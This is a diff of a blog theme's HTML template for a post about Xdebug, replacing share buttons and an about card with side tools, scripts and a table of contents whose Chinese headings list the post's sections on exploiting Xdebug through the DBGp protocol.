-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Facebook"
-                    aria-label="分享到 Facebook"
-                >
-                    <i class="fab fa-facebook" aria-hidden="true"></i>
-                </a>
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
             </li>
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Twitter"
-                    aria-label="分享到 Twitter"
-                >
-                    <i class="fab fa-twitter" aria-hidden="true"></i>
-                </a>
-            </li>
+
+        <!-- go comment -->
         
-            
-            
-            <li class="post-action hide-xs">
-                <a
-                    class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/xdebug/"
-                    title="分享到 Google+"
-                    aria-label="分享到 Google+"
-                >
-                    <i class="fab fa-google-plus" aria-hidden="true"></i>
-                </a>
-            </li>
-        
-        
-            
-        
-        <li class="post-action">
-            
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
-            
-                <i class="fa fa-list" aria-hidden="true"></i>
-            </a>
-        </li>
     </ul>
 </div>
 
-
-                </div>
-                
-    <div id="share-options-bar" class="share-options-bar" data-behavior="4">
-        <i id="btn-close-shareoptions" class="fa fa-times"></i>
-        <ul class="share-options">
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/09/24/xdebug/"
-                        aria-label="分享到 Facebook"
-                    >
-                        <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/09/24/xdebug/"
-                        aria-label="分享到 Twitter"
-                    >
-                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
-                    </a>
-                </li>
-            
-                
-                
-                <li class="share-option">
-                    <a
-                        class="share-option-btn"
-                        target="new"
-                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/09/24/xdebug/"
-                        aria-label="分享到 Google+"
-                    >
-                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
-                    </a>
-                </li>
-            
-        </ul>
-    </div>
-
-
-            
         </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
         
 
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
 
-<div id="about">
-    <div id="about-card">
-        <div id="about-btn-close">
-            <i class="fa fa-times"></i>
-        </div>
-        
-            <h4 id="about-card-name">John Doe</h4>
-        
-            <div id="about-card-bio"><p>author.bio</p>
-</div>
-        
-        
-            <div id="about-card-job">
-                <i class="fa fa-briefcase"></i>
-                <br/>
-                <p>author.job</p>
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
 
-            </div>
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
         
-        
-    </div>
+    </ul>
 </div>
 
-        
-        
-<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
-        <!--SCRIPTS-->
-<script src="/assets/js/script-hvks0tjho7hhxxjwgvjgerqzsheh4pu8sgih6uruqsx2fdeiyiflclfy2v4q.min.js"></script>
-<!--SCRIPTS END-->
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">工作原理</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9E%E8%BF%9E%E5%9C%B0%E5%9D%80"><span class="nav-text">回连地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%BA%E5%AE%9Aip%E6%A8%A1%E5%BC%8F"><span class="nav-text">固定ip模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%9D%9E%E5%9B%BA%E5%AE%9Aip%E6%A8%A1%E5%BC%8F"><span class="nav-text">非固定ip模式</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBGp%E5%8D%8F%E8%AE%AE"><span class="nav-text">DBGp协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#source"><span class="nav-text">source</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval"><span class="nav-text">eval</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#property-set"><span class="nav-text">property_set</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE"><span class="nav-text">攻击链</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text">执行命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file%E5%8D%8F%E8%AE%AE%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-text">file协议读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8source%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="nav-text">利用source读文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%99%E6%9C%A8%E9%A9%AC"><span class="nav-text">写木马</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
 
 
     
 
+</main>
 
 
 
-    </body>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
 </html>
